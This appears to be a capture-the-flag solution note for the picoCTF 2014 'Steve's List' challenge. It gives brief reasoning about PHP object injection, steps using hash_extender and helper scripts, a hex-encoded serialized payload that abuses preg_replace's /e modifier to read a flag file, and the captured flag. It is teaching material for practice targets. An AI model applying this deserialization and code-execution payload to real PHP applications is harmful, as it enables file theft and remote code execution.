@@ -1,0 +1,18 @@
+https://www.owasp.org/index.php/PHP_Object_Injection
+
+we dont need __wakeup
+
+we just need an object that is used
+
+maybe we need a Post object that is destroyed, and a Filter object we control the fields of both, so we can add that filter to the post and then have the filter use preg_replace with e
+
+---
+1. Go to hash_extender and run `make`
+2. Run `php steve.php`
+3. Run `./steve.sh <output from step 2> hex`
+        aka `./steve.sh 0A4F3A343A22506F7374223A333A7B733A383A22002A007469746C65223B733A353A227469746C65223B733A373A22002A0074657874223B733A343A2274657874223B733A31303A22002A0066696C74657273223B613A313A7B693A303B4F3A363A2246696C746572223A323A7B733A31303A22002A007061747465726E223B733A373A222F746578742F65223B733A373A22002A007265706C223B733A34343A2266696C655F6765745F636F6E74656E747328222F686F6D652F64616564616C75732F666C61672E7478742229223B7D7D7D hex`
+
+FLAG: D43d4lu5_w45_h3r3_w1th_s3rialization_chief_steve
+
+
+# solution courtesy of https://github.com/benwaffle/picoctf-2014/tree/master/solutions/steveslist
